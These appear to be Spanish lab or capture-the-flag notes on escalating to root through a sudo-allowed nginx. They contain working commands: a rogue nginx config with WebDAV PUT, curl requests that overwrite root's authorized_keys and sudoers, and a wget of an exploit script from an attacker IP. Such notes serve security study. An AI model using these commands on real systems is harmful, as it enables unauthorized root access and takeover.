____
## 🧠 Concepto clave

Cuando un usuario puede ejecutar `nginx` con `sudo`, tiene control total sobre la configuración del servidor — lo que incluye el usuario con el que corre el proceso, los archivos que puede leer y escribir, y los scripts que puede ejecutar. Como `nginx` se lanza como root, puede leer y escribir cualquier archivo del sistema, incluyendo `/root/.ssh/authorized_keys`, `/etc/passwd`, o ejecutar scripts CGI con privilegios de root.
```bash
# Confirmar el vector
sudo -l | grep nginx
# (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

---

## 📌 Opción 1 — Explotación manual

La explotación manual se basa en crear una configuración de nginx personalizada que instruya al proceso — corriendo como root — a realizar acciones privilegiadas. El enfoque más limpio es escribir nuestra clave pública SSH en `/root/.ssh/authorized_keys`.

### Paso 1 — Generar par de claves SSH
```bash
ssh-keygen -t rsa -b 4096 -f /tmp/root_key -N ""
```

`-t rsa` — Tipo de clave RSA.
`-b 4096` — 4096 bits de longitud.
`-f /tmp/root_key` — Ruta donde se guardan la clave privada (`root_key`) y pública (`root_key.pub`).
`-N ""` — Sin passphrase — necesario para que SSH no pida contraseña al conectar.

### Paso 2 — Crear la configuración maliciosa de nginx

> [!tip] Crear el archivo de configuración nginx malicioso
> ```bash
> cat > /tmp/nginx_privesc.conf << EOF
> user root;
> worker_processes 1;
> pid /tmp/nginx.pid;
>
> events {
>     worker_connections 1024;
> }
>
> http {
>     server {
>         listen 1337;
>         root /;
>         autoindex on;
>         dav_methods PUT;
>     }
> }
> EOF
> ```
>
> `user root` — **Crítico**: instruye a nginx a ejecutar sus worker processes como root. Esto es lo que permite que nginx tenga acceso completo al sistema de ficheros.
> `listen 1337` — Puerto arbitrario donde nginx escuchará peticiones.
> `root /` — Raíz del servidor web: la raíz del sistema de ficheros completo. Con esto nginx puede servir cualquier archivo del sistema.
> `autoindex on` — Habilita el listado de directorios — permite navegar el sistema de ficheros.
> `dav_methods PUT` — Habilita el método HTTP PUT — permite **escribir archivos** en cualquier ruta del sistema de ficheros enviando peticiones HTTP PUT. Esta es la clave de la escalada.

### Paso 3 — Lanzar nginx con la configuración maliciosa

> [!tip] Iniciar nginx como root con la configuración maliciosa
> ```bash
> sudo nginx -c /tmp/nginx_privesc.conf
> ```
>
> `sudo nginx` — Lanza nginx con privilegios de root.
> `-c /tmp/nginx_privesc.conf` — Usa la configuración personalizada en lugar de la del sistema.

### Paso 4 — Escribir la clave pública en authorized_keys de root

> [!tip] Usar HTTP PUT para escribir la clave pública en el authorized_keys de root
> ```bash
> # Asegurarse de que el directorio .ssh de root existe
> curl -X PUT http://localhost:1337/root/.ssh/ -d ""
>
> # Escribir la clave pública vía HTTP PUT
> curl -X PUT http://localhost:1337/root/.ssh/authorized_keys -d "$(cat /tmp/root_key.pub)"
> ```
>
> `curl -X PUT` — Envía una petición HTTP PUT al servidor nginx que está corriendo como root. Nginx, al tener `dav_methods PUT` habilitado y `user root`, escribe el body de la petición directamente en la ruta especificada con permisos de root.
> `http://localhost:1337/root/.ssh/authorized_keys` — La URL se traduce a la ruta `/root/.ssh/authorized_keys` en el sistema de ficheros — que normalmente solo root puede escribir.
> `-d "$(cat /tmp/root_key.pub)"` — El contenido de la petición PUT es la clave pública generada en el paso 1.

### Paso 5 — Conectar como root

> [!tip] Autenticarse como root usando la clave privada
> ```bash
> ssh -i /tmp/root_key root@localhost
> ```

### Alternativas al vector de clave SSH

> [!important] Nginx con sudo no está limitado a escribir claves SSH. Hay otros vectores igualmente válidos dependiendo del entorno:

**Añadir usuario sudoer al /etc/sudoers:**
```bash
curl -X PUT http://localhost:1337/etc/sudoers.d/privesc -d "activemq ALL=(ALL) NOPASSWD: ALL"
```

**Hacer /bin/bash SUID:**
```bash
# Crear un script que ejecute chmod
echo '#!/bin/bash' > /tmp/suid.sh
echo 'chmod u+s /bin/bash' >> /tmp/suid.sh
chmod +x /tmp/suid.sh

# Configuración nginx con CGI para ejecutar el script como root
# (requiere módulo ngx_http_perl_module o similar)
```

La opción más directa y compatible es siempre la de **HTTP PUT sobre authorized_keys** — funciona en cualquier nginx sin módulos adicionales.

---

## 📌 Opción 2 — Explotación automatizada con nginx_sudo_privesc

> [!info] **nginx_sudo_privesc** 📄 [github.com/DylanGrl/nginx_sudo_privesc](https://github.com/DylanGrl/nginx_sudo_privesc)
> Script bash que automatiza completamente la escalada via sudo nginx. Genera el par de claves SSH, crea la configuración maliciosa de nginx, lanza el servidor, escribe la clave pública en `/root/.ssh/authorized_keys` mediante HTTP PUT, y proporciona el comando SSH para conectar. Encapsula todos los pasos manuales descritos anteriormente en un único script.

**Transferir el script a la máquina víctima:**

> [!tip] Descargar y transferir el exploit
> ```bash
> # En el atacante — descargar y servir el script
> wget https://raw.githubusercontent.com/DylanGrl/nginx_sudo_privesc/main/exploit.sh
> python3 -m http.server 8080
>
> # En la víctima — descargar el script desde el atacante
> wget http://ATACANTE_IP:8080/exploit.sh
> chmod +x exploit.sh
> ```
>
> El servidor HTTP Python sirve el archivo desde el directorio actual. La víctima lo descarga directamente desde el atacante sin necesidad de ningún servicio adicional.

**Ejecutar el exploit:**

> [!tip] Lanzar el script de escalada automática
> ```bash
> ./exploit.sh
> ```

El script realiza automáticamente todos los pasos: genera las claves SSH como el usuario actual (`activemq` en este caso), usa `sudo nginx` para lanzar el servidor web como root con WebDAV habilitado, escribe la clave pública en `/root/.ssh/authorized_keys` mediante HTTP PUT, y muestra el comando SSH para conectar.

**Conectar como root:**

> [!tip] Acceder como root con la clave generada por el script
> ```bash
> ssh -i id_rsa root@localhost
> ```
>
> `id_rsa` — Clave privada generada por el script en el directorio actual. Su pareja pública fue escrita en `/root/.ssh/authorized_keys` a través de nginx corriendo como root.
> `root@localhost` — Conectamos como root al propio sistema local — no necesitamos conectar desde fuera.

---

## 📌 Resumen del flujo de la escalada
```
[activemq] sudo nginx -c config_maliciosa.conf
    │
    │  nginx lanza workers como ROOT (user root en config)
    │  nginx expone WebDAV (HTTP PUT) con root / como raíz
    ▼
[nginx corriendo como ROOT]
    │
    │  curl -X PUT /root/.ssh/authorized_keys
    │  (clave pública generada por activemq)
    ▼
[/root/.ssh/authorized_keys] ← escrito con permisos de root
    │
    ▼
ssh -i id_rsa root@localhost → SHELL COMO ROOT
```

## 🔗 Relaciones / Contexto

El vector sudo nginx es un ejemplo claro de por qué el principio de mínimo privilegio es crítico. Nginx es un binario extremadamente flexible — puede configurarse para hacer casi cualquier cosa con los permisos del usuario que lo ejecuta. Dar sudo sobre nginx es funcionalmente equivalente a dar sudo sin restricciones. En GTFOBins, nginx aparece documentado bajo la categoría sudo con este mismo vector de HTTP PUT para escribir archivos arbitrarios como root.